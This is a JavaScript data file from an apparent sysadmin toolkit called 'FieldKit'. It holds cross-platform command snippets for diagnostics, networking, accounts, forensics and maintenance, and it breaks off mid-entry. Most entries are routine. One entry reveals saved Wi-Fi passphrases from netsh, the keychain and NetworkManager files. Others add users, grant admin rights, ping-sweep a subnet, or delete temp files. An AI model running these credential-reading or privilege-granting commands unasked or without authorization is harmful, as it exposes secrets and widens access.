/* FieldKit — command library data.
   Loaded by FieldKit.html via <script src="library-data.js">, which works from
   file:// (a fetched .json would be blocked). Sets window.FIELDKIT_LIBRARY.
   Schema + how to add entries: see CONTRIBUTING.md. */
window.FIELDKIT_LIBRARY = [
/* ---------- SYSTEM INFO ---------- */
{id:"sys-summary", cat:"System Info", title:"System & hardware summary",
 desc:"OS, model, CPU, and architecture at a glance.",
 code:{
  ps:`Get-CimInstance Win32_OperatingSystem |
  Select-Object CSName, Caption, Version, OSArchitecture, @{n='InstalledRAM_GB';e={[math]::Round($_.TotalVisibleMemorySize/1MB,1)}}
Get-CimInstance Win32_ComputerSystem | Select-Object Manufacturer, Model
Get-CimInstance Win32_Processor  | Select-Object Name, NumberOfCores, NumberOfLogicalProcessors`,
  cmd:`systeminfo | findstr /C:"OS Name" /C:"OS Version" /C:"System Manufacturer" /C:"System Model" /C:"System Type" /C:"Total Physical Memory"`,
  py:`import platform, socket
print("Host      :", socket.gethostname())
print("OS        :", platform.system(), platform.release())
print("Version   :", platform.version())
print("Machine   :", platform.machine())
print("Processor :", platform.processor())`,
  mac:`echo "Host : $(hostname)"
sw_vers
echo "Model: $(sysctl -n hw.model)"
sysctl -n machdep.cpu.brand_string
echo "Cores: $(sysctl -n hw.ncpu)  Arch: $(uname -m)"`,
  linux:`echo "Host : $(hostname)"
uname -a
[ -r /etc/os-release ] && . /etc/os-release && echo "OS   : $PRETTY_NAME"
lscpu | grep -E 'Model name|^CPU\\(s\\)|Architecture'`
 }},
{id:"sys-uptime", cat:"System Info", title:"Uptime / last boot",
 desc:"How long the machine has been running since last boot.",
 code:{
  ps:`$b=(Get-CimInstance Win32_OperatingSystem).LastBootUpTime
"Last boot : $b"
"Uptime    : {0:dd}d {0:hh}h {0:mm}m" -f ((Get-Date)-$b)`,
  cmd:`net statistics workstation | find "Statistics since"`,
  mac:`uptime
# last boot as a date:
date -r $(sysctl -n kern.boottime | sed -E 's/.*sec = ([0-9]+).*/\\1/')`,
  linux:`uptime -p
echo "Since: $(uptime -s)"`,
  py:`import subprocess, sys
# Standard-lib friendly: read boot time from /proc on Linux
try:
    with open('/proc/uptime') as f:
        secs=float(f.read().split()[0])
    print(f"Uptime: {int(secs//86400)}d {int(secs%86400//3600)}h {int(secs%3600//60)}m")
except FileNotFoundError:
    print("Run on Linux, or use: import psutil; psutil.boot_time()")`
 }},
{id:"sys-serial", cat:"System Info", title:"Serial number / asset tag",
 desc:"Pull the BIOS serial for asset tracking or warranty lookup.",
 code:{
  ps:`Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SerialNumber, SMBIOSBIOSVersion
Get-CimInstance Win32_ComputerSystemProduct | Select-Object Name, IdentifyingNumber`,
  cmd:`wmic bios get serialnumber
wmic csproduct get name,identifyingnumber`,
  mac:`system_profiler SPHardwareDataType |
  awk -F': ' '/Serial Number|Model Identifier|Hardware UUID/{print $1": "$2}'`,
  linux:`sudo dmidecode -s system-serial-number
sudo dmidecode -s system-product-name`
 }},

/* ---------- NETWORK ---------- */
{id:"net-ipconfig", cat:"Network", title:"IP configuration (all adapters)",
 desc:"Addresses, gateways, DNS servers, and MACs for every interface.",
 code:{
  ps:`Get-NetIPConfiguration | Format-List InterfaceAlias, IPv4Address, IPv4DefaultGateway, DNSServer
Get-NetAdapter | Select-Object Name, Status, MacAddress, LinkSpeed`,
  cmd:`ipconfig /all`,
  mac:`ifconfig | grep -E '^[a-z]|inet '
echo "-- routes --"; netstat -rn | grep -E '^default'
echo "-- dns --"; scutil --dns | awk '/nameserver/{print $3}' | sort -u`,
  linux:`ip -brief addr
echo "-- routes --"; ip route
echo "-- dns --"; resolvectl status 2>/dev/null | grep 'DNS Server' || cat /etc/resolv.conf`,
  py:`import socket
host=socket.gethostname()
print("Host:", host)
print("Primary IP:", socket.gethostbyname(host))
for res in socket.getaddrinfo(host, None):
    print(res[4][0])`
 }},
{id:"net-public-ip", cat:"Network", title:"Public / WAN IP address",
 desc:"Ask an external service what IP the internet sees you as.",
 code:{
  ps:`(Invoke-RestMethod -Uri 'https://ifconfig.me/ip').Trim()`,
  cmd:`curl -s https://ifconfig.me`,
  mac:`curl -s https://ifconfig.me; echo`,
  linux:`curl -s https://ifconfig.me; echo`,
  py:`import urllib.request
print(urllib.request.urlopen("https://ifconfig.me/ip", timeout=6).read().decode().strip())`
 }},
{id:"net-ping-sweep", cat:"Network", title:"Ping sweep a /24 subnet",
 desc:"Find live hosts on a local subnet. Set the base to your network.",
 code:{
  ps:`$base='192.168.1'
1..254 | ForEach-Object {
  if (Test-Connection "$base.$_" -Count 1 -Quiet -TimeoutSeconds 1) { "$base.$_  UP" }
}`,
  cmd:`@echo off
set base=192.168.1
for /L %%i in (1,1,254) do @ping -n 1 -w 200 %base%.%%i | find "TTL=" >nul && echo %base%.%%i UP`,
  mac:`base=192.168.1
for i in $(seq 1 254); do
  ping -c1 -t1 "\${base}.\${i}" >/dev/null 2>&1 && echo "\${base}.\${i} UP" &
done; wait`,
  linux:`base=192.168.1
for i in $(seq 1 254); do
  ping -c1 -W1 "\${base}.\${i}" >/dev/null 2>&1 && echo "\${base}.\${i} UP" &
done; wait`,
  py:`import subprocess, platform, concurrent.futures as cf
base="192.168.1"
flag="-n" if platform.system()=="Windows" else "-c"
def up(i):
    ip=f"{base}.{i}"
    r=subprocess.run(["ping",flag,"1",ip],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    return ip if r.returncode==0 else None
with cf.ThreadPoolExecutor(max_workers=64) as ex:
    for ip in filter(None, ex.map(up, range(1,255))):
        print(ip, "UP")`
 }},
{id:"net-port-check", cat:"Network", title:"Check if a TCP port is open",
 desc:"Test reachability of host:port — quick service-up check.",
 code:{
  ps:`Test-NetConnection -ComputerName example.com -Port 443 |
  Select-Object ComputerName, RemotePort, TcpTestSucceeded`,
  mac:`host=example.com; port=443
# BSD nc: -G connect timeout (s)
nc -z -G3 "$host" "$port" && echo OPEN || echo CLOSED`,
  linux:`host=example.com; port=443
timeout 3 bash -c "</dev/tcp/\${host}/\${port}" && echo "OPEN" || echo "CLOSED"`,
  py:`import socket
host, port = "example.com", 443
s=socket.socket(); s.settimeout(3)
print("OPEN" if s.connect_ex((host,port))==0 else "CLOSED")
s.close()`
 }},
{id:"net-listening", cat:"Network", title:"Listening ports + owning process",
 desc:"What's accepting connections, and which PID owns it.",
 code:{
  ps:`Get-NetTCPConnection -State Listen |
  Select-Object LocalAddress, LocalPort,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess).ProcessName}}, OwningProcess |
  Sort-Object LocalPort`,
  cmd:`netstat -ano | findstr LISTENING`,
  mac:`sudo lsof -nP -iTCP -sTCP:LISTEN`,
  linux:`ss -tulpn 2>/dev/null || sudo ss -tulpn`
 }},
{id:"net-dns", cat:"Network", title:"DNS lookup",
 desc:"Resolve a hostname to its A/AAAA records.",
 code:{
  ps:`Resolve-DnsName example.com | Select-Object Name, Type, IPAddress`,
  cmd:`nslookup example.com`,
  mac:`dig +short example.com A AAAA || nslookup example.com`,
  linux:`dig +short example.com A AAAA || nslookup example.com`,
  py:`import socket
name="example.com"
for fam,_,_,_,addr in socket.getaddrinfo(name,None):
    print(addr[0])`
 }},
{id:"net-arp", cat:"Network", title:"ARP / neighbor table",
 desc:"Map local IPs to MAC addresses — spot devices on the LAN.",
 code:{
  ps:`Get-NetNeighbor -AddressFamily IPv4 |
  Where-Object State -in 'Reachable','Stale' |
  Select-Object IPAddress, LinkLayerAddress, State`,
  cmd:`arp -a`,
  mac:`arp -an`,
  linux:`ip neigh show`
 }},
{id:"net-wifi-pw", cat:"Network", title:"Saved Wi-Fi profiles & keys (Windows)",
 desc:"List stored wireless networks and reveal a saved passphrase.",
 danger:"Only on machines you are authorized to service.",
 code:{
  cmd:`netsh wlan show profiles
:: reveal one profile's key:
netsh wlan show profile name="SSID_HERE" key=clear | findstr "Key Content"`,
  ps:`(netsh wlan show profiles) |
  Select-String ':\\s(.+)$' |
  ForEach-Object {
    $ssid=$_.Matches.Groups[1].Value.Trim()
    $key=(netsh wlan show profile name="$ssid" key=clear |
      Select-String 'Key Content\\s+:\\s(.+)$').Matches.Groups[1].Value
    [pscustomobject]@{SSID=$ssid; Key=$key}
  }`,
  mac:`# reveal a saved Wi-Fi password from the keychain (prompts for admin):
security find-generic-password -wa "SSID_HERE"   # set the SSID`,
  linux:`# NetworkManager stores keys here (root):
sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ 2>/dev/null`
 }},

/* ---------- USERS & ACCESS ---------- */
{id:"usr-list", cat:"Users & Access", title:"List local user accounts",
 desc:"Enumerate local accounts and whether they're enabled.",
 code:{
  ps:`Get-LocalUser | Select-Object Name, Enabled, LastLogon, Description`,
  cmd:`net user`,
  mac:`# real (non-service) accounts hide the leading-underscore system users:
dscl . -list /Users | grep -v '^_'`,
  linux:`getent passwd | awk -F: '$3>=1000 && $3<65534 {print $1"  (uid "$3")"}'`
 }},
{id:"usr-admins", cat:"Users & Access", title:"List administrators / sudoers",
 desc:"Who has elevated rights on this box.",
 code:{
  ps:`Get-LocalGroupMember -Group 'Administrators' |
  Select-Object Name, ObjectClass, PrincipalSource`,
  cmd:`net localgroup administrators`,
  mac:`dscl . -read /Groups/admin GroupMembership`,
  linux:`echo "sudo:";  getent group sudo  | cut -d: -f4
echo "wheel:"; getent group wheel | cut -d: -f4`
 }},
{id:"usr-create", cat:"Users & Access", title:"Create a local user",
 desc:"Add a standard local account. Edit the name before running.",
 danger:"Modifies accounts — run only where authorized.",
 code:{
  ps:`$pw = Read-Host 'New password' -AsSecureString
New-LocalUser -Name 'techuser' -Password $pw -FullName 'Field Tech' -Description 'Service account'`,
  cmd:`net user techuser * /add`,
  mac:`# -password - prompts interactively for the new password:
sudo sysadminctl -addUser techuser -fullName "Field Tech" -password -`,
  linux:`sudo useradd -m -s /bin/bash techuser
sudo passwd techuser`
 }},
{id:"usr-mkadmin", cat:"Users & Access", title:"Grant admin / sudo to a user",
 desc:"Add an existing account to the admin group.",
 danger:"Privilege change — run only where authorized.",
 code:{
  ps:`Add-LocalGroupMember -Group 'Administrators' -Member 'techuser'`,
  cmd:`net localgroup administrators techuser /add`,
  mac:`sudo dseditgroup -o edit -a techuser -t user admin`,
  linux:`sudo usermod -aG sudo techuser   # Debian/Ubuntu
# sudo usermod -aG wheel techuser  # RHEL/Fedora`
 }},
{id:"usr-loggedon", cat:"Users & Access", title:"Who is logged on",
 desc:"Current interactive and remote sessions.",
 code:{
  ps:`query user 2>$null
Get-CimInstance Win32_LoggedOnUser | Select-Object -Expand Antecedent -Unique`,
  cmd:`query user`,
  mac:`who
echo "-- active --"; w`,
  linux:`who -u
echo "-- active --"; w`
 }},
{id:"usr-amiadmin", cat:"Users & Access", title:"Am I admin / root?",
 desc:"Check whether the current shell is elevated before you start.",
 code:{
  ps:`$p=[Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
if ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {'Elevated'} else {'NOT elevated'}`,
  cmd:`net session >nul 2>&1 && echo Elevated || echo NOT elevated`,
  mac:`[ "$(id -u)" -eq 0 ] && echo "root" || echo "not root"`,
  linux:`[ "$(id -u)" -eq 0 ] && echo "root" || echo "not root"`,
  py:`import os, ctypes
try:
    admin = ctypes.windll.shell32.IsUserAnAdmin() != 0   # Windows
except AttributeError:
    admin = (os.geteuid() == 0)                          # POSIX
print("Elevated" if admin else "NOT elevated")`
 }},

/* ---------- DISK & FILES ---------- */
{id:"disk-usage", cat:"Disk & Files", title:"Disk usage / free space",
 desc:"Capacity and free space per volume.",
 code:{
  ps:`Get-Volume | Where-Object DriveLetter |
  Select-Object DriveLetter, FileSystemLabel,
    @{n='Size_GB';e={[math]::Round($_.Size/1GB,1)}},
    @{n='Free_GB';e={[math]::Round($_.SizeRemaining/1GB,1)}}`,
  cmd:`wmic logicaldisk get caption,volumename,size,freespace`,
  mac:`df -h
echo "-- volumes --"; diskutil list`,
  linux:`df -hT -x tmpfs -x devtmpfs`,
  py:`import shutil, string, os
if os.name=="nt":
    drives=[f"{d}:\\\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\\\")]
else:
    drives=["/"]
for d in drives:
    t,u,f=shutil.disk_usage(d)
    print(f"{d}  size {t//2**30}G  free {f//2**30}G")`
 }},
{id:"disk-large", cat:"Disk & Files", title:"Find the largest files",
 desc:"Top space hogs under the current folder — cleanup triage.",
 code:{
  ps:`Get-ChildItem -Path . -Recurse -File -ErrorAction SilentlyContinue |
  Sort-Object Length -Descending | Select-Object -First 20 FullName,
    @{n='MB';e={[math]::Round($_.Length/1MB,1)}}`,
  mac:`du -ah . 2>/dev/null | sort -rh | head -20`,
  linux:`du -ah . 2>/dev/null | sort -rh | head -20`,
  py:`import os
files=[]
for root,_,names in os.walk("."):
    for n in names:
        p=os.path.join(root,n)
        try: files.append((os.path.getsize(p),p))
        except OSError: pass
for size,p in sorted(files,reverse=True)[:20]:
    print(f"{size/1048576:8.1f} MB  {p}")`
 }},
{id:"disk-findext", cat:"Disk & Files", title:"Find files by extension",
 desc:"Recursively locate all files of a given type.",
 code:{
  ps:`Get-ChildItem -Path . -Recurse -Filter *.log -File |
  Select-Object FullName, LastWriteTime, Length`,
  cmd:`dir /s /b *.log`,
  mac:`# -printf is GNU-only; use BSD stat for the mtime:
find . -type f -name '*.log' -exec stat -f '%Sm  %N' {} +`,
  linux:`find . -type f -name '*.log' -printf '%TY-%Tm-%Td  %p\\n'`,
  py:`from pathlib import Path
for p in Path(".").rglob("*.log"):
    print(p)`
 }},
{id:"disk-hash", cat:"Disk & Files", title:"Hash a file (SHA-256)",
 desc:"Verify integrity or match a known-good/known-bad hash.",
 code:{
  ps:`Get-FileHash -Path .\\file.bin -Algorithm SHA256 | Select-Object Hash, Path`,
  cmd:`certutil -hashfile file.bin SHA256`,
  mac:`shasum -a 256 file.bin`,
  linux:`sha256sum file.bin`,
  py:`import hashlib
h=hashlib.sha256()
with open("file.bin","rb") as f:
    for chunk in iter(lambda: f.read(1<<20), b""):
        h.update(chunk)
print(h.hexdigest())`
 }},

/* ---------- PROCESSES & SERVICES ---------- */
{id:"proc-top", cat:"Processes & Services", title:"Top processes by CPU / memory",
 desc:"See what's actually eating the machine right now.",
 code:{
  ps:`Get-Process | Sort-Object CPU -Descending |
  Select-Object -First 15 Name, Id,
    @{n='CPU_s';e={[math]::Round($_.CPU,1)}},
    @{n='RAM_MB';e={[math]::Round($_.WorkingSet64/1MB,1)}}`,
  cmd:`tasklist /v /fo table | more`,
  mac:`ps aux -r | head -16   # BSD ps: -r sorts by CPU`,
  linux:`ps aux --sort=-%cpu | head -16`
 }},
{id:"proc-kill", cat:"Processes & Services", title:"Kill a process by name",
 desc:"Force-stop a hung application.",
 danger:"Force-terminates processes — unsaved data may be lost.",
 code:{
  ps:`Stop-Process -Name 'notepad' -Force`,
  cmd:`taskkill /IM notepad.exe /F`,
  mac:`pkill -f notepad`,
  linux:`pkill -f notepad`
 }},
{id:"proc-services", cat:"Processes & Services", title:"Running services",
 desc:"List services currently in the running state.",
 code:{
  ps:`Get-Service | Where-Object Status -eq 'Running' |
  Select-Object Status, Name, DisplayName | Sort-Object DisplayName`,
  cmd:`net start`,
  mac:`launchctl list`,
  linux:`systemctl list-units --type=service --state=running --no-pager`
 }},
{id:"proc-restart-svc", cat:"Processes & Services", title:"Restart a service",
 desc:"Bounce a service (example: the print spooler).",
 code:{
  ps:`Restart-Service -Name 'Spooler' -Force
Get-Service Spooler | Select-Object Status, Name`,
  cmd:`net stop Spooler && net start Spooler`,
  mac:`# bounce a launchd service (example: CUPS printing):
sudo launchctl kickstart -k system/org.cups.cupsd`,
  linux:`sudo systemctl restart cups
systemctl is-active cups`
 }},
{id:"proc-startup", cat:"Processes & Services", title:"Startup / autorun items",
 desc:"What launches at boot or logon — a common malware hiding spot.",
 code:{
  ps:`Get-CimInstance Win32_StartupCommand |
  Select-Object Name, Command, Location, User`,
  cmd:`wmic startup get caption,command,location`,
  mac:`launchctl list
echo "-- launch agents / daemons --"
ls -1 ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons 2>/dev/null`,
  linux:`systemctl list-unit-files --state=enabled --no-pager
ls -la ~/.config/autostart/ 2>/dev/null`
 }},

/* ---------- FORENSICS ---------- */
{id:"for-recent", cat:"Forensics", title:"Recently modified files (last 24h)",
 desc:"Surface files touched in the last day — activity triage.",
 code:{
  ps:`Get-ChildItem -Path . -Recurse -File -ErrorAction SilentlyContinue |
  Where-Object LastWriteTime -gt (Get-Date).AddDays(-1) |
  Select-Object LastWriteTime, FullName | Sort-Object LastWriteTime -Descending`,
  mac:`find . -type f -mtime -1 -exec stat -f '%Sm  %N' {} + 2>/dev/null | sort`,
  linux:`find . -type f -mtime -1 -printf '%TY-%Tm-%Td %TH:%TM  %p\\n' 2>/dev/null | sort`,
  py:`import os, time
cut=time.time()-86400
for root,_,names in os.walk("."):
    for n in names:
        p=os.path.join(root,n)
        try:
            m=os.path.getmtime(p)
            if m>cut: print(time.strftime('%Y-%m-%d %H:%M',time.localtime(m)),p)
        except OSError: pass`
 }},
{id:"for-logons", cat:"Forensics", title:"Recent successful logons (Event 4624)",
 desc:"Pull the last logon events from the Security log.",
 danger:"Requires administrator / SeSecurityPrivilege.",
 code:{
  ps:`Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 25 |
  Select-Object TimeCreated,
    @{n='User';e={$_.Properties[5].Value}},
    @{n='LogonType';e={$_.Properties[8].Value}},
    @{n='Source';e={$_.Properties[18].Value}}`,
  cmd:`wevtutil qe Security /q:"*[System[(EventID=4624)]]" /c:25 /rd:true /f:text`
 }},
{id:"for-usb", cat:"Forensics", title:"USB storage device history (Windows)",
 desc:"Devices that have been connected, from the registry.",
 code:{
  ps:`Get-ChildItem 'HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR' |
  ForEach-Object { $_.PSChildName }`,
  cmd:`reg query HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR`
 }},
{id:"for-prefetch", cat:"Forensics", title:"Prefetch listing (execution evidence)",
 desc:"List .pf files with timestamps — evidence of program execution.",
 code:{
  ps:`Get-ChildItem 'C:\\Windows\\Prefetch\\*.pf' -ErrorAction SilentlyContinue |
  Select-Object Name, LastWriteTime, Length | Sort-Object LastWriteTime -Descending`,
  cmd:`dir /o-d C:\\Windows\\Prefetch\\*.pf`
 }},
{id:"for-hashdir", cat:"Forensics", title:"Hash every file in a folder → CSV",
 desc:"Build an integrity manifest for a directory of evidence.",
 code:{
  ps:`Get-ChildItem -Path . -Recurse -File |
  Get-FileHash -Algorithm SHA256 |
  Select-Object Hash, Path |
  Export-Csv -Path .\\hashes.csv -NoTypeInformation
"Wrote hashes.csv"`,
  mac:`find . -type f -exec shasum -a 256 {} + > hashes.txt
echo "Wrote hashes.txt (\$(wc -l < hashes.txt | tr -d ' ') files)"`,
  linux:`find . -type f -exec sha256sum {} \\; > hashes.txt
echo "Wrote hashes.txt (\$(wc -l < hashes.txt) files)"`,
  py:`import hashlib, csv, os
with open("hashes.csv","w",newline="") as out:
    w=csv.writer(out); w.writerow(["sha256","path"])
    for root,_,names in os.walk("."):
        for n in names:
            p=os.path.join(root,n)
            h=hashlib.sha256()
            try:
                with open(p,"rb") as f:
                    for c in iter(lambda: f.read(1<<20), b""): h.update(c)
                w.writerow([h.hexdigest(),p])
            except OSError: pass
print("Wrote hashes.csv")`
 }},
{id:"for-installed", cat:"Forensics", title:"Installed programs list",
 desc:"Enumerate installed software from the uninstall registry keys.",
 code:{
  ps:`$paths='HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*',
        'HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'
Get-ItemProperty $paths -ErrorAction SilentlyContinue |
  Where-Object DisplayName |
  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
  Sort-Object DisplayName`,
  cmd:`reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s /f DisplayName`
 }},

/* ---------- SECURITY ---------- */
{id:"sec-firewall", cat:"Security", title:"Firewall status",
 desc:"Are the firewall profiles on, and what's the default action.",
 code:{
  ps:`Get-NetFirewallProfile |
  Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction`,
  cmd:`netsh advfirewall show allprofiles state`,
  mac:`# application firewall + packet filter:
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
sudo pfctl -s info 2>/dev/null`,
  linux:`sudo ufw status verbose 2>/dev/null || sudo iptables -L -n -v`
 }},
{id:"sec-defender", cat:"Security", title:"Windows Defender status",
 desc:"Real-time protection, signature age, and last scan.",
 code:{
  ps:`Get-MpComputerStatus |
  Select-Object AMRunningMode, RealTimeProtectionEnabled,
    AntivirusSignatureLastUpdated, QuickScanEndTime, AntispywareEnabled`
 }},
{id:"sec-hotfix", cat:"Security", title:"Installed updates / hotfixes",
 desc:"Patch level and most recent updates applied.",
 code:{
  ps:`Get-HotFix | Sort-Object InstalledOn -Descending |
  Select-Object -First 20 HotFixID, Description, InstalledOn`,
  cmd:`wmic qfe list brief /format:table`,
  mac:`# OS update history (falls back to full install history):
softwareupdate --history 2>/dev/null || system_profiler SPInstallHistoryDataType`,
  linux:`# Debian/Ubuntu recent package changes:
grep " install \\| upgrade " /var/log/dpkg.log 2>/dev/null | tail -20`
 }},

/* ---------- MAINTENANCE ---------- */
{id:"mnt-temp", cat:"Maintenance", title:"Clear temp files",
 desc:"Wipe the current user's temp folder to reclaim space.",
 danger:"Deletes files — closes nothing gracefully. Skips locked files.",
 code:{
  ps:`Remove-Item "$env:TEMP\\*" -Recurse -Force -ErrorAction SilentlyContinue
"Cleared $env:TEMP"`,
  cmd:`del /q /f /s "%TEMP%\\*" >nul 2>&1
echo Cleared %TEMP%`,
  mac:`rm -rf "\${TMPDIR:-/tmp}"/* 2>/dev/null; echo "Cleared \${TMPDIR:-/tmp}"`,
  linux:`rm -rf "\${TMPDIR:-/tmp}"/* 2>/dev/null; echo "Cleared \${TMPDIR:-/tmp}"`
 }},
{id:"mnt-flushdns", cat:"Maintenance", title:"Flush DNS cache",
 desc:"Clear the resolver cache after a DNS change.",
 code:{
  ps:`Clear-DnsClientCache; "DNS cache flushed"`,
  cmd:`ipconfig /flushdns`,
  mac:`sudo dscacheutil -flushcache; sudo killall -HUP mDNSResponder; echo "DNS cache flushed"`,
  linux:`sudo resolvectl flush-caches 2>/dev/null || sudo systemd-resolve --flush-caches`
 }},
{id:"mnt-sfc", cat:"Maintenance", title:"Repair system files (SFC + DISM)",
 desc:"Standard Windows corruption repair sequence.",
 danger:"Long-running; run in an elevated prompt.",
 code:{
  cmd:`DISM /Online /Cleanup-Image /RestoreHealth
sfc /scannow`,
  ps:`Repair-WindowsImage -Online -RestoreHealth
sfc /scannow`
 }},
{id:"mnt-recycle", cat:"Maintenance", title:"Empty the Recycle Bin",
 desc:"Clear the recycle bin across all drives.",
 danger:"Permanently deletes recycled files.",
 code:{
  ps:`Clear-RecycleBin -Force -ErrorAction SilentlyContinue; "Recycle Bin emptied"`,
  cmd:`rd /s /q C:\\$Recycle.Bin 2>nul & echo Done`
 }},

/* ==================================================================
   ADDED — common tasks for network / account / security admins,
   repair techs, and everyday users.
   ================================================================== */

/* ---------- SYSTEM INFO (added) ---------- */
{id:"sys-env", cat:"System Info", title:"Environment variables / PATH",
 desc:"Dump environment variables and expand PATH one entry per line.",
 code:{
  ps:`Get-ChildItem Env: | Sort-Object Name
"-- PATH --"; $env:Path -split ';'`,
  cmd:`set
echo.& echo -- PATH --
echo %PATH%`,
  mac:`printenv | sort
echo "-- PATH --"; echo "$PATH" | tr ':' '\\n'`,
  linux:`printenv | sort
echo "-- PATH --"; echo "$PATH" | tr ':' '\\n'`,
  py:`import os
for k in sorted(os.environ): print(f"{k}={os.environ[k]}")
print("-- PATH --")
print(*os.environ.get("PATH","").split(os.pathsep), sep="\\n")`
 }},
{id:"sys-memory", cat:"System Info", title:"Memory usage (used / free)",
 desc:"Physical RAM total, used, and available right now.",
 code:{
  ps:`$os=Get-CimInstance Win32_OperatingSystem
[pscustomobject]@{
  Total_GB=[math]::Round($os.TotalVisibleMemorySize/1MB,1)
  Free_GB =[math]::Round($os.FreePhysicalMemory/1MB,1)
  Used_GB =[math]::Round(($os.TotalVisibleMemorySize-$os.FreePhysicalMemory)/1MB,1)
}`,
  cmd:`systeminfo | findstr /C:"Total Physical Memory" /C:"Available Physical Memory"`,
  mac:`top -l 1 | grep -E "PhysMem"
vm_stat`,
  linux:`free -h`
 }},
{id:"sys-battery", cat:"System Info", title:"Battery status & health",
 desc:"Charge level and, where available, battery health/condition.",
 code:{
  ps:`Get-CimInstance Win32_Battery | Select-Object EstimatedChargeRemaining, BatteryStatus
# full HTML health report:
powercfg /batteryreport /output "$env:USERPROFILE\\battery-report.html"`,
  cmd:`powercfg /batteryreport /output "%USERPROFILE%\\battery-report.html"`,
  mac:`pmset -g batt
system_profiler SPPowerDataType | grep -iE -A2 "condition|cycle count|maximum capacity"`,
  linux:`# sysfs, no deps:
cat /sys/class/power_supply/BAT*/capacity /sys/class/power_supply/BAT*/status 2>/dev/null
# richer detail if installed: upower -i $(upower -e | grep BAT)`
 }},
{id:"sys-time", cat:"System Info", title:"Date, time & clock sync",
 desc:"Current time, timezone, and whether the clock is syncing to NTP.",
 code:{
  ps:`Get-Date
Get-TimeZone | Select-Object Id, DisplayName
w32tm /query /status`,
  cmd:`echo %DATE% %TIME%
w32tm /query /status`,
  mac:`date "+%Y-%m-%d %H:%M:%S %Z"
sudo systemsetup -getnetworktimeserver 2>/dev/null
sudo systemsetup -getusingnetworktime 2>/dev/null`,
  linux:`timedatectl`
 }},
{id:"sys-drivers", cat:"System Info", title:"Drivers & hardware devices",
 desc:"Enumerate device drivers / kernel modules and attached hardware.",
 code:{
  ps:`Get-CimInstance Win32_PnPSignedDriver |
  Select-Object DeviceName, DriverVersion, Manufacturer, DriverDate |
  Sort-Object DeviceName`,
  cmd:`driverquery /v /fo table`,
  mac:`system_profiler SPPCIDataType SPUSBDataType
# third-party kernel extensions:
kextstat 2>/dev/null | grep -v com.apple`,
  linux:`# needs pciutils / usbutils for lspci / lsusb:
lspci -k 2>/dev/null; echo "-- usb --"; lsusb 2>/dev/null
echo "-- loaded modules --"; lsmod`
 }},
{id:"sys-display", cat:"System Info", title:"GPU & display info",
 desc:"Graphics adapter, driver, and connected monitors / resolution.",
 code:{
  ps:`Get-CimInstance Win32_VideoController |
  Select-Object Name, DriverVersion,
    CurrentHorizontalResolution, CurrentVerticalResolution, CurrentRefreshRate`,
  cmd:`wmic path win32_VideoController get name,driverversion,videomodedescription
:: wmic is deprecated; prefer PowerShell Get-CimInstance Win32_VideoController`,
  mac:`system_profiler SPDisplaysDataType`,
  linux:`lspci 2>/dev/null | grep -Ei 'vga|3d|display'
xrandr --query 2>/dev/null | grep ' connected'`
 }},

/* ---------- NETWORK (added) ---------- */
{id:"net-traceroute", cat:"Network", title:"Trace route to a host",
 desc:"Show the L3 hops between you and a destination.",
 code:{
  ps:`Test-NetConnection example.com -TraceRoute |
  Select-Object -ExpandProperty TraceRoute`,
  cmd:`tracert example.com`,
  mac:`traceroute example.com`,
  linux:`traceroute example.com || tracepath example.com   # traceroute may need install`
 }},
{id:"net-dhcp-renew", cat:"Network", title:"Release & renew DHCP lease",
 desc:"Force a new DHCP address — first step after IP/gateway trouble.",
 danger:"Drops connectivity for a moment; over SSH/RDP you may lose the session.",
 code:{
  ps:`ipconfig /release
ipconfig /renew`,
  cmd:`ipconfig /release
ipconfig /renew`,
  mac:`# set your interface (en0 Wi-Fi, en0/en1 Ethernet):
sudo ipconfig set en0 DHCP`,
  linux:`sudo dhclient -r && sudo dhclient        # or: sudo networkctl renew eth0`
 }},
{id:"net-routes", cat:"Network", title:"Routing table",
 desc:"Active routes and the default gateway per interface.",
 code:{
  ps:`Get-NetRoute -AddressFamily IPv4 |
  Sort-Object RouteMetric |
  Select-Object DestinationPrefix, NextHop, RouteMetric, ifIndex`,
  cmd:`route print -4`,
  mac:`netstat -rn -f inet`,
  linux:`ip route`
 }},
{id:"net-connections", cat:"Network", title:"Active TCP connections + process",
 desc:"Established sessions and which process owns each.",
 code:{
  ps:`Get-NetTCPConnection -State Established |
  Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}}`,
  cmd:`netstat -ano | findstr ESTABLISHED`,
  mac:`sudo lsof -nP -iTCP -sTCP:ESTABLISHED`,
  linux:`ss -tnp state established`
 }},
{id:"net-dns-records", cat:"Network", title:"Query DNS record types (MX/TXT/…)",
 desc:"Look up mail, text, and alias records — mail/SPF/DKIM troubleshooting.",
 code:{
  ps:`foreach ($t in 'MX','TXT','NS','CNAME') {
  "== $t =="; Resolve-DnsName -Type $t example.com -ErrorAction SilentlyContinue
}`,
  cmd:`nslookup -type=MX example.com
nslookup -type=TXT example.com`,
  mac:`for t in MX TXT NS CNAME; do echo "== $t =="; dig +short example.com $t; done`,
  linux:`for t in MX TXT NS CNAME; do echo "== $t =="; dig +short example.com $t; done   # dig: dnsutils/bind-utils`
 }},
{id:"net-http-head", cat:"Network", title:"HTTP status & response headers",
 desc:"Check a URL's status code, redirects, and server headers.",
 code:{
  ps:`$r = Invoke-WebRequest -Uri 'https://example.com' -Method Head
"Status: $([int]$r.StatusCode) $($r.StatusDescription)"
$r.Headers`,
  cmd:`curl -sI https://example.com`,
